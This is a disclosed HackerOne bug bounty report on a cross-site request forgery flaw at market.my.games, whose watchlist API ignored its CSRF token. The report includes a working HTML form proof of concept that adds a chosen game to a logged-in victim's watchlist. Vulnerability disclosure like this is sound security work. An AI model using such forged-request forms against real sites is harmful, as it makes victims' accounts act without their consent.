---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '802930'
original_report_id: '802930'
title: CSRF on https://market.my.games
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mailru
created_at: '2020-02-23T18:28:18.269Z'
disclosed_at: '2020-04-06T12:43:14.812Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: Ext. B Scope
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF on https://market.my.games

## Metadata

- HackerOne Report ID: 802930
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mailru
- Disclosed At: 2020-04-06T12:43:14.812Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Description
Hi team,
While exploring https://market.my.games/ domain, I got this domain is vulnerable to CSRF. This site include an `X-CSRFToken` in headers but it seems the server doesn't validate it at all.
Many endpoints require `application/json` as their `content-type` so we can't exploit this issue against them but I found `api/watchlist` endpoint doesn't require it so we can abuse this against this endpoint.

## PoC
- Save the following code as `ex.html` in your pc:   

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://market.my.games/api/watchlist/37/" method="POST" enctype="text/plain">
      <input type="hidden" name="null" value="" />
      <input type="submit" value="Go" />
    </form>
  </body>
</html>
```
- Go to https://account.my.games and login to your account
- Open `ex.html` in your browser and click on `Go`
- The game that assured to 37 will be added to your wishlist

## Impact

Vulnerable endpoint it's not so sensitive, but an attacker can abuse this to add arbitrary games to users wishlist, so the impact of this is low, Also because it doesn't validate `X-CSRFToken` it's better to fix it.
Please note, I read your rules and I'm aware of 
> Reports of missed protection mechanism / best current practice (e.g. no CSRF token, framing/clickjacking protection) without demonstration of real security impact for user or system

But this endpoint require authentication that's why I think this is a valid report and it's better to fix it.
Best regards,
@Naategh

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
